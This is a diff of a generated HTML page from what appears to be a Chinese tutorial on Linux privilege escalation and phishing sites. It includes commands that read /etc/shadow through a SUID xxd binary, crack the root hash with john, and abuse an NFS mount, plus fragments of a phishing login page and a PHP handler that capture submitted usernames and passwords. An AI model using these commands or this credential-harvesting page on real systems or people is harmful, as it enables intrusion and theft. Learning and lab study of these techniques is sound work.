@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="提权(续) 以下命令除非特别指出，均在ssh中执行\n寻找敏感的隐藏文件\n1 find / -name &#34;.*&#34; -type f -path &#34;/home/*&#34; -exec ls -al {} \\; 2&gt;/dev/null 有可能找到用户自己存储的明文密码，使用cat查看，再使用su [用户名]切换到对应权限\nSID提权 输入以下命令查看可以使用的命令\n1 find / -perm -4000 -type f -exec ls -al {} \\; 可以看到/usr/bin/xxd，接着使用下面的命令查看加密后的密码\n1 xxd /etc/shadow | xxd -r 复制其中root账户的全部内容（从root:到:::）保存为txt（以Desktop/pass.txt为例）\n接着使用破解工具 john 进行字典破解（字典可能打包了，需要手动解压一下）\n1 2 cd Desktop/ john pass.txt -w=/usr/share/wordlists/rockyou.txt NFS提权 注意：本小节的大部分命令在本机中执行\n扫描目标服务器端口\n1 nmap [目标ip] 发现对方可能开启了2049端口，接着查看对方挂载了哪些文件夹\n返回：/home/peter *\n1 showmount -e [目标ip] 接着我们在自己的系统上打开终端创建一个文件夹方便将对方的文件夹挂载到自己的系统上，具体操作如下 （需要使用root权限执行） ：\n1 2 3 4 5 cd /tmp mkdir nfs cd nfs mount -t nfs [对方ip]:[对方挂载的文件夹] /tmp/nfs/ ls -la # 查看里面有什么文件夹 接下来我们想要把自己的bash复制到这个这个挂载的文件夹里面去，从而实现提权，但是直接copy会提示 权限不够 （因为我们系统上的root在对方看来只是一个低权限的外人），所以我们要伪造一个和对方一模一样的账户 peter\n">
 <title>1.11 Linux提权(续)和钓鱼网站</title>
@@ -929,22 +929,22 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// 获取元素
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">loginForm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;loginForm&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">loginForm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;loginForm&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">loadingOverlay</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;loadingOverlay&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// 监听表单提交事件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">loginForm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">loginForm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="c1">// 阻止默认的表单提交行为（因为要等6秒再跳转）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">            
 </span></span><span class="line"><span class="cl">            <span class="c1">// 先验证表单（HTML5 required验证）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kr">const</span> <span class="nx">isValid</span> <span class="o">=</span> <span class="nx">loginForm</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">isValid</span> <span class="o">=</span> <span class="nx">loginForm</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isValid</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                <span class="c1">// 验证通过，显示加载动画
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;active&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">                <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;active&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                
 </span></span><span class="line"><span class="cl">                <span class="c1">// 6秒后跳转到welcome.php
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">                <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;要跳转的网页链接&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                <span class="p">},</span> <span class="mi">6000</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -956,7 +956,7 @@
 </span></span><span class="line"><span class="cl">                <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;表单提交失败:&#39;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                    <span class="c1">// 提交失败时隐藏加载动画并提示
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;active&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">                    <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;active&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                    <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;登录请求提交失败，请重试&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="p">});</span>
 </span></span><span class="line"><span class="cl">                
@@ -964,7 +964,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">});</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// 防止点击加载遮罩层关闭动画
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nx">loadingOverlay</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nx">stopPropagation</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">        <span class="p">});</span>
 </span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
@@ -1007,13 +1007,13 @@
 </span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;db.php&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 仅处理POST请求
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// 获取用户输入（trim去除首尾空格，避免空值插入）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$user_input</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$user_input</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$pass_input</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// 验证输入不为空（可选，按需求保留/删除）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$pass_input</span><span class="p">))</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$pass_input</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;用户名或密码不能为空！&#39;); window.history.back();&lt;/script&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
